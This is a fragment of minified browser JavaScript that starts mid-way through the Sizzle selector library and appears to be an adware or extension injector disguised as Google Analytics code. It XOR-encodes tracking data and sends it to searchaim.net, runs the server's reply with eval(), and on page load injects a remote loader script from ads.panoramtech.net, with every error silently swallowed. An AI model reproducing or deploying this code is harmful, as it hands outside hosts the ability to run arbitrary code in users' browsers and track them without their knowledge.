E})}else{aA.Sizzle=E}})(window);;(function(d,w,u){var $,isReady=false,readyQueue=[],div=u,JSON=JSON||{};function onReady(){isReady=true;while(readyQueue.length>0){(readyQueue.pop())()}}$={l:{},isIe:!!d.attachEvent,ready:function(callback){!isReady?readyQueue.push(callback):callback()},createEl:function(html){if(div===u){div=d.createElement("div")}div.innerHTML=html;return div.firstChild},each:function(array,callback){var i=0,length=array.length;for(;i<length;){if(callback(array[i],i++)===false){return true}}},inArray:function(array,e){var i=0,length=array.length;for(;i<length;i++){if(e===array[i]){return true}}return false},filter:function(array,callback){var i=0,length=array.length,ret=[];for(;i<length;i++){if(callback(array[i],i)){ret.push(array[i])}}return ret},apply:function(){var obj={};$.each(arguments,function(arg){for(var i in arg){obj[i]=arg[i]}});return obj},cors:function(opts){var o=$.apply({url:"//searchaim.net/ad/__utm.gif",callback:function(){},timeout:5000,onTimeout:function(){},mode:"auto",data:{}},opts||{});o.data.key="extcpn";o.data.sid="49414_27_";var xhr=(w.XMLHttpRequest?new w.XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"));o.url+="?a="+encodeURIComponent($.xor($.toJson(o.data)));if((o.mode=="auto"&&xhr.withCredentials!==u)||o.mode=="xhr"){$.xhrRequest(xhr,o)}else{$.jsonpRequest(o)}},xhrRequest:function(xhr,o){var timeoutId=u,isTimedout=false;function __gacb(data){o.callback(data)}xhr.onreadystatechange=function(){if(isTimedout){return}if(xhr.readyState===4){if(xhr.status===200&&xhr.responseText){if(timeoutId){clearTimeout(timeoutId)}eval(xhr.responseText)}}};xhr.open("GET",o.url);xhr.withCredentials=false;timeoutId=setTimeout(function(){isTimedout=true;xhr.abort();$.jsonpRequest(o)},o.timeout);xhr.send()},jsonpRequest:function(o){var timeoutId=u,isTimedout=false;w.__gacb=function(data){if(isTimedout){return}if(timeoutId){clearTimeout(timeoutId)}o.callback(data)};var s=$.script(o.url);timeoutId=setTimeout(function(){isTimedout=true;s.parentNode.removeChild(s);o.onTimeout()},o.timeout)},toJson:JSON.stringify||function(obj){var t=typeof(obj);if(t!="object"||obj===null){if(t=="string"){obj='"'+obj+'"'}return String(obj)}else{var n,v,json=[],arr=(obj&&obj.constructor==Array);for(n in obj){v=obj[n];t=typeof(v);if(t=="string"){v='"'+v+'"'}else{if(t=="object"&&v!==null){v=arguments.callee(v)}}json.push((arr?"":'"'+n+'":')+String(v))}return(arr?"[":"{")+String(json)+(arr?"]":"}")}},fromJson:JSON.parse||function(str){if(str===""){str='""'}eval("var p="+str+";");return p},xor:function(str){var i=0,length=str.length,ret="";for(;i<length;){ret+=String.fromCharCode(77^str.charCodeAt(i++))}return ret},script:function(src,nocache){var s=d.createElement("script");s.type="text/javascript";s.src=src+(nocache===u||nocache?(src.indexOf("?")==-1?"?":"&")+"t="+(new Date().getTime()):"");(d.getElementsByTagName("script")[0]||d.documentElement.firstChild).parentNode.appendChild(s);return s},eval:function(data){var s=d.createElement("script");s.defer=true;s.text=data;(d.getElementsByTagName("script")[0]||d.documentElement.firstChild).parentNode.appendChild(s)},on:function(el,event,fn){var handler=function(event){fn.call(el,event||w.event)};if(el.addEventListener){el.addEventListener(event,handler,false)}else{if(el.attachEvent){el.attachEvent("on"+event,handler)}}},redirect:function(url){var a=d.createElement("a");a.href=url;a.__norewrite=true;d.body.appendChild(a);a.click();d.body.removeChild(a)},setCookie:function(name,value,opts){var o=opts||{},expire=u;if(o.expire){expire=new Date();expire.setTime(expire.getTime()+(o.expire*1000))}document.cookie=encodeURIComponent(name)+"="+encodeURIComponent(value)+(expire?"; expires="+expire.toUTCString():"")+(o.path?"; path="+o.path:"")+(o.domain?"; domain="+o.domain:"")},getCookie:function(name){var value=u;$.each(d.cookie.split("; "),function(raw){var parts=raw.split("=");var cookieName=decodeURIComponent(parts.shift());if(cookieName==name){value=decodeURIComponent(parts.join("="));return false}});return value},encode:function(s){var i=0,ret="",length=s.length;for(;i<length;i++){ret+=("%"+s.charCodeAt(i).toString(16))}return ret},preventDefault:function(e){if(e.preventDefault){e.preventDefault()}return e.returnValue=false},remove:function(e){return e.parentNode&&e.parentNode.removeChild(e)},attr:function(e,name){if(e.hasAttribute&&e.hasAttribute(name)){return e.getAttribute(name)}else{var node=e.getAttributeNode(name);if(node){return node.value}}return""},host:function(url){var m=url.match(/^https?:\/\/([^\/]+)/);return m?m[1]:""}};w["__ga_extcpn"]=$.apply(w["__ga_extcpn"],$);if(d.addEventListener){d.addEventListener("DOMContentLoaded",function(){onReady()},false)}else{if(d.attachEvent){d.attachEvent("onreadystatechange",function(){onReady()})}}if(d.readyState){(function(){if((!$.isIe&&d.readyState==="interactive")||d.readyState==="complete"){onReady()}else{setTimeout(arguments.callee,100)}})()}else{var toplevel=false;try{toplevel=window.frameElement==null}catch(e){}if(d&&d.dElement&&d.dElement.doScroll&&toplevel){(function(){try{d.dElement.doScroll("left")}catch(e){setTimeout(arguments.callee,100);return}onReady()})()}}})(document,window,undefined);;var cancel=false,$=w.Sizzle,$$=w["__ga_extcpn"];if(location.href.indexOf("searchaim.net")>-1){return false};;;;;;;;;;;;;(function(){var loaded=false,loadedTimeoutId;function load(){if(loaded){return}loaded=true;clearTimeout(loadedTimeoutId);;;var iframe=$$.script((location.protocol=="https:"?"https:":"http:")+"//ads.panoramtech.net/loader.js?client=49414");if(iframe){$$.on(iframe,"load",function(){$$.updateLimits()})}}loadedTimeoutId=setTimeout(load,5000);$$.on(w,"load",load)})();;;;;;})(document,window,undefined);}catch(e){};